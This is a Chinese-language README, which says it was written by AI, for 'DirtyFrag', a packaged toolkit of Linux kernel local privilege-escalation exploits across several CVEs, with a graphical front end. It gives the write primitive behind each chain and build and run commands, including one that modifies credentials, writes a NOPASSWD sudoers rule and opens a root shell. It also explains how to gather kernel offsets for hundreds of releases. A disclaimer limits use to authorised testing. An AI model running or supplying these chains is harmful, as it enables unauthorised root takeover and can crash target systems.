# DirtyFrag

!此项目由AI编写!
Linux 页缓存写原语 / 本地提权 PoC 合集，带一个 GTK3 图形前端和一个 Open vSwitch 独立引擎。

> **免责声明**
> 本项目仅用于**自有设备**或**已获得书面授权的渗透测试**。
> 这些程序会修改内核对象、向 `/etc/sudoers.d` 写入 NOPASSWD 规则、并可能让目标系统崩溃。
> 在你不拥有或没有授权的主机上运行属于违法行为。作者不对任何滥用后果负责。

---

## 组成

| 文件 | 说明 |
|---|---|
| `dirtyfrag-gui.c` | GTK3 前端（XFCE 适配）。负责拼命令行、在 pty 里跑引擎、渲染彩色日志 |
| `dirtyfrag_lpe.c` | 主引擎，五条链的实现，也可单独编成命令行 `poc` |
| `ovswrap.c` | CVE-2026-64531（net/openvswitch CT action 越界）独立实现 + 内嵌内核偏移表 |
| `dirtyfrag.c` | CVE-2026-43284 早期单版本 PoC（针对 4.14.186 逐行对齐） |
| `rxrpc_primitive.c` | CVE-2026-43500 写原语最小验证，不需要 root、不改磁盘 |
| `cve_2026_43500_recon.c` | CVE-2026-43500 环境可达性探测 |
| `ghostlock.c` | CVE-2026-43499（rtmutex `remove_waiter()`）独立验证 |

内置的漏洞链：

| 编号 | 子系统 | 原语 |
|---|---|---|
| CVE-2026-31431 | AF_ALG / AEAD | splice 文件页进 AEAD，原地解密写 4 字节 |
| CVE-2026-43284 | XFRM / ESP | 非线性 skb 原地解密写页缓存 |
| CVE-2026-43500 | RxRPC / RXKAD | splice + 共享分片，fcrypt 原地解密 |
| CVE-2026-43494 | io_uring + RDS | 页引用计数劫持 |
| CVE-2026-46331 | net/sched act_pedit | skb 越界写 |
| CVE-2026-64531 | net/openvswitch | CT action 越界 → 伪造 SET action → 任意读 + `dst_release` 递减写 |

---

## 构建

```bash
# 依赖：gtk+-3.0 开发包
sudo apt install build-essential libgtk-3-dev pkg-config

make                 # GUI 单二进制（GUI + 五链引擎 + OVS 引擎）
make poc             # 独立的命令行引擎
make ovswrap         # 独立的 OVS 引擎
sudo make install    # 装到 /usr/local/bin，背景图与 offset/ 进 share/dirtyfrag
```

`make` 会把两个引擎的 `main` 改名（`-Dmain=dirtyfrag_poc_main` / `-Dmain=ovswrap_main`）后链进同一个可执行文件。

内核模块（可选，见下）：

```bash
make kmod            # 需要目标机的 linux-headers-$(uname -r)
```

---

## 使用

### GUI

```bash
./dirtyfrag-gui          # 或安装后直接 dirtyfrag-gui
```

下拉框选链 → 填目标用户名 → 运行。前端用 pty 启动引擎，所以引擎里的 `isatty()` 判断、
彩色输出、成功后的交互式 root shell 都正常。

### OVS 引擎（CVE-2026-64531）

```bash
./ovswrap -check                 # 前置条件：配置表 / openvswitch 模块 / BTF / userns
./ovswrap -scan                  # 只建读写原语并自检，不改任何东西
./ovswrap -start -t alice        # 完整链：改 cred -> 写 sudoers -> root shell

./ovswrap -krec 6.8.0-100-generic    # 借用另一条 release 的偏移
./ovswrap -offset ./offset           # 指定配置表根目录
./ovswrap -dump-krec                 # 导出本机偏移记录（JSON）
./ovswrap -dump-target               # 导出本机配置表（target.h）
```

必须以**普通用户**运行（root 会被拒绝），且 `openvswitch` 模块已加载。
跑完记得删掉写入的 sudoers 规则；如果追加进了 `/etc/sudoers`，重启前先 `visudo -c`。

### 其它单文件 PoC

```bash
make poc && ./poc                # 五链命令行版
gcc -O2 -o recon cve_2026_43500_recon.c && ./recon
gcc -O2 -o primitive rxrpc_primitive.c && ./primitive
```

---

## 内核偏移配置表（`offset/`）

CVE-2026-64531 需要 29 个结构体字段偏移、2 个符号偏移和 4 项行为参数，
全部由内核构建决定。它们放在源码树外的纯文本表里，**换内核不用重编**。

```
offset/
├── 5系/5.8.0-59-generic/target.h
├── 6系/6.8.0-100-generic/target.h
└── 7系/7.0.0-14-generic/target.h
```

第一层是 `uname -r` 首数字 + `系`，第二层原样照抄 `uname -r`，文件名固定 `target.h`。
`target.h` 既能被逐行解析，也是合法 C 头文件（可以直接 `#include` 静态编译）。

**查找顺序**

1. `-offset <dir>`
2. 环境变量 `$OVSWRAP_OFFSET_DIR`
3. `<exe 目录>/offset`
4. `./offset`
5. `/usr/share/dirtyfrag/offset`
6. 内嵌表（`ovswrap.c` 里的 808 条记录，去重后 739 个 release）
7. 本机推导（BTF / pahole / System.map）

**当前内容**：740 个 release —— 739 个由内嵌表导出（`make offset-sync`），
外加 `5系/5.8.0-59-generic` 是在真机上用内核模块读出来的。详见 `offset/README.md`。

### 给新内核加一条

三条路，任选：

**A. 有 BTF**

```bash
./ovswrap -dump-target > /tmp/target.h    # 自动读 /sys/kernel/btf/*
mkdir -p offset/6系/$(uname -r) && cp /tmp/target.h offset/6系/$(uname -r)/
```

**B. 没 BTF（没开 `CONFIG_DEBUG_INFO_BTF`）**

用 `tools/kmod` 里的内核模块，`offsetof()` 由编译器在目标内核上算出来，天然不会对不上：

```bash
make kmod && sudo insmod tools/kmod/krec_dump.ko
cat /proc/krec_dump > rec.json
sudo rmmod krec_dump
python3 tools/add_krec.py rec.json ovswrap.c      # 并进内嵌表
python3 tools/mk_offset.py rec.json --root offset # 或只写进 offset/
```

**C. 手写**

照着 `offset/README.md` 的字段说明填 `target.h`，放对目录即可。四个行为参数
（`read_carrier` / `write_carrier` / `read_lanes` / `tunnel_info`）推不出来，只能实测：
先用 `-carrier labels-only`、`-lanes ttl,tos,tp_src_0` 试，`-scan` 能过就说明对了。

---

## 目录

```
.
├── dirtyfrag-gui.c          图形前端
├── dirtyfrag_lpe.c          五链引擎（亦可单独编 poc）
├── ovswrap.c                OVS 引擎 + 内嵌偏移表
├── dirtyfrag.c              43284 单版本 PoC
├── rxrpc_primitive.c        43500 原语验证
├── cve_2026_43500_recon.c   43500 可达性探测
├── ghostlock.c              43499 独立验证
├── offset/                  内核偏移配置表（740 个 release）
├── krec-808.json            内嵌表完整导出（808 条）
├── tools/
│   ├── gen_krec_table.py    内嵌表的解码 / 打包 / 导出
│   ├── add_krec.py          把一条记录并进 ovswrap.c 的表
│   ├── mk_offset.py         把记录写成 offset/<N>系/<release>/target.h
│   └── kmod/krec_dump.c     没 BTF 时用内核模块直接读偏移
└── Makefile
```

## License

MIT。内核模块 `tools/kmod/krec_dump.c` 为 GPL-2.0（内核模块必须）。
